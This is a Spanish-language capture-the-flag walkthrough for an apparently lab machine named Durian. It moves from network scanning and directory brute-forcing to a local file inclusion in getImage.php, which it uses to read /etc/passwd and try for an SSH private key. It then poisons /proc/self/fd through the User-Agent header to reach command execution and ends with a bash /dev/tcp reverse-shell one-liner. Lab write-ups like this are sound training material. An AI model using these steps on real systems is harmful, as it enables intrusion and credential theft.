### Tags: 

# Reconocimiento (`Linux`)
Lo primero que hacemos es un **escaneo de equipos** que estén conectados ami red de esta forma:

```ruby
arp-scan -I eth0 --localnet
```

![image](https://github.com/user-attachments/assets/0d841dc0-3bbe-40cb-b2c0-6bc7d8cefb0d)

# Escaneo (*22, 80, 7080, 8000, 8088*)

```css
sudo nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn <IP>
```

![image](https://github.com/user-attachments/assets/b0112b72-bead-4b9a-8bf3-936cd03d381d)

```css
sudo nmap -p22,80,7080,8000,8088 -sCV 192.168.0.137 -oN escaneo 
```

![image](https://github.com/user-attachments/assets/94a84aa7-fb19-46ab-a11d-7a2163c1d7ea)
![image](https://github.com/user-attachments/assets/83c1dc7d-bc97-402e-80bd-8ce1d91cf2c6)


# Port 80 *-* 8000 *-* 8088

- Estos 3 puertos contiene la misma información que es una imagen que no me carga que es esta:
	- Por ende mucho no podemos hacer por ahora

![image](https://github.com/user-attachments/assets/0336f7c8-328a-469c-b4f9-942e99fb6b03)

## Gobuster

Lo que hicimos es jugar con **gobuster** para descubrir directorios y nos encontró el `/cgi-data/`

```ruby
gobuster dir -u http://<IP>  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html --add-slash
```

![image](https://github.com/user-attachments/assets/ede42644-3bd8-403d-99b0-6b57eced0a9b)

Tenemos es `getImage.php`

![image](https://github.com/user-attachments/assets/07bc8e11-fbcd-4b34-8e2e-8870e8f95ada)

# LFI 

En donde si pinchamos en ese archivo y hacemos un `Ctrl + u` observamos esto:

![image](https://github.com/user-attachments/assets/798b4477-a37c-4a92-9587-ed78fde50507)

El cual como vimos poniendo `?file=/etc/passwd` tenemos un LFI

![image](https://github.com/user-attachments/assets/6296c3df-4acc-43bc-af35-8362e2b00c2c)

- Enumeramos procesos que se puedan estar corriendo en la máquina para ver que es lo que hay y vimos **Apache y Mysqld** pero nada interesante
	- comando: `file=/proc/sched_debug`

- También tratamos de listar los **logs** *de apache* pero nada 
	- comando:  `file=/var/log/apache2/access.log`

- Como estaba el puerto **ssh** activo vas a probar listar *los logs de conexión ssh* pero tampoco obtuvimos nada
	- comando:  `file=/var/log/auth.log`

- Tratamos de leer la **clave id_rsa** de Durian pero no pudimos tampoco
	- comando: `file=/home/durian/.ssh/id_rsa`

# BurpSuite

- Lo que hacemos ahora es interceptar la petición con Burp ya que a veces hay ciertos logs los podemos ver atendiendo a otras rutas en el sistema.
	- Lo que vamos a hacer es atentar a esta ruta del sistema `/proc/self/fd`  **informa sobre los archivos abiertos por un proceso**
	- Si haces en nuestra máquina un **ls** `/proc/self/fd` vemos unos números pero en la máquina que ataques capas puede haber como 40

![image](https://github.com/user-attachments/assets/bea0e28c-e363-4988-8944-45699bc1fef6)

### Intruder ---> Sniper

Lo primeor que hacemos e scapturar la peticion con Burp y mandarlo al Repeater

![image](https://github.com/user-attachments/assets/0662e375-8b5f-481e-8f68-9f1ce786ecbd)

- Ahora lo que hacemos es hacer un Ataque de tipo **SNIPER** al `/proc/self/fd/0` en el **Intruder** del 1 hasta al 40 y ver la longitud de respuesta:
	- Haces un `Ctrl + i` así lo mandamos al Intruder y hacer estos pasos:

![image](https://github.com/user-attachments/assets/0a3ff041-6106-4d31-bae8-e2a796ec4c0f)

Ahora nos vamos a la sección `Payloads` , en **Paylod type** lo hacemos de tipo `Numbers` desde el 1 hasta el 30 de uno en uno

![image](https://github.com/user-attachments/assets/2f8d3723-3493-4528-9b31-a511fe5eb376)

Si vemos en el numero 8 tenesmo una longitud de respuestas bastantes distintas a las otras 

![image](https://github.com/user-attachments/assets/9695103d-8795-497e-82bd-7f2231914b9b)

- Si lo mandamos al `Repeater` observamos esto cuando le damos a send
	- Una petición **GET** a la raíz y el **User-Agent** de quien realizo la petición

![image](https://github.com/user-attachments/assets/fbfc2272-5c1f-4347-83a6-7805c839748e)

Entonces lo que hacemos es poner código PHP en el `User-Agent` ya que lo podemos manipular nosotros 

![image](https://github.com/user-attachments/assets/29ca8e47-8f1b-4302-b28e-3b2c95f64746)

Una ves que le dimos a **Send**, esto nos debería haber representado un **log** entonces si en la web ponemos lo siguiente, vemos que tenemos **ejecución remota de comandos**

![image](https://github.com/user-attachments/assets/b5543e64-1ffb-4826-a0eb-43f5a788c9ac)
![image](https://github.com/user-attachments/assets/e8fec28c-4704-4db7-932f-083039e841b9)

- Ahora lo que hacemos es ganar acceso a la máquina:
	 - Primero nos ponemos en escucha
    
```css
nc - nlvp 4444
```

Nos mandamos una Reverse-Shell

```ruby
bash -c "bash -i >%26 /dev/tcp/<IP>/4444 0>%261"
```












